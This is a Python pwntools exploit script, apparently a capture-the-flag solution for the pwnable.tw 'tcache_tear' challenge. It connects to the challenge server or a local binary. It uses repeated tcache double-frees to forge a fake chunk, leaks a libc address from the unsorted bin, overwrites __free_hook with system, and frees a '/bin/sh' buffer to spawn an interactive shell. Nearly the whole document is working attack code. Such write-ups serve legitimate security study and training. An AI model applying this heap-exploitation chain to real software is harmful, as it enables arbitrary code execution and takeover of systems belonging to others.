#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe



def malloc(size, data):
    r.sendafter(b"choice :", b"1")
    r.sendafter(b"Size:", f"{size}".encode())
    r.sendafter(b"Data:", data)

def free():
    r.sendafter(b"choice :", b"2")

def info_3():
    r.sendafter(b"choice :", b"3")
    r.recvuntil(b"Name :")
    r.recv(16)
    return u64(r.recv(6)+b"\x00\x00")


if args.LOCAL:
    r = process([exe.path])
    #if args.DEBUG:
    #gdb.attach(r, gdbscript='''
    #    b *0x400b99
    #    c
    #    ''')
    #input()
else:
    r = remote("chall.pwnable.tw", 10207)


def main():
    address_name = 0x602060
    # Setup fake chunk (size: 0x600)
    r.sendafter(b"Name:", p64(0)+p64(0x601))

    malloc(0x40, b"ko co gi") # Chunk A
    # Double Free
    free()
    free()
    # tcache for size 0x50 -> Chunk A -> Chunk A
    malloc(0x40, p64(address_name+0x600))
    # tcache for size 0x50 -> Chunk A -> Fake (&name+0x600)
    malloc(0x40, b"abc")
    # tcache for size 0x50 -> Fake (&name+0x600)
    malloc(0x40, p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21))

    

    malloc(0x30, b"chunk B") # Chunk B
    # Double Free
    free()
    free()
    # tcache for size 0x40 -> Chunk B -> Chunk B
    malloc(0x30, p64(address_name+0x10))
    # tcache for size 0x40 -> Chunk B -> fake chunk (size: 0x600)
    malloc(0x30, b"lol")
    # tcache for size 0x40 -> fake chunk (size: 0x600)
    malloc(0x30, b"leak")

    free()
    # fd and bk of fake chunk (size: 0x600) point to main_arena (unsorted bin)

    # Leak
    leak_libc = info_3()
    libc.address = leak_libc - 0x3ebca0
    print("[*] libc: ", hex(libc.address))
    print("[*] __free_hook: ", hex(libc.sym['__free_hook']))


    # Target: __free_hook

    malloc(0x60, b"nothing") #Chunk C
    # Double Free
    free()
    free()
    # tcache for size 0x70 -> Chunk C -> Chunk C
    malloc(0x60, p64(libc.sym['__free_hook']))
    # tcache for size 0x70 -> Chunk C -> &__free_hook
    malloc(0x60, b"end")
    # tcache for size 0x70 -> &__free_hook
    malloc(0x60, p64(libc.sym['system']))

    #now __free_hook = system

    #Create a pointer to "/bin/sh" using malloc
    malloc(0x18, b"/bin/sh\x00")

    #trigger system("/bin/sh")
    free()

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
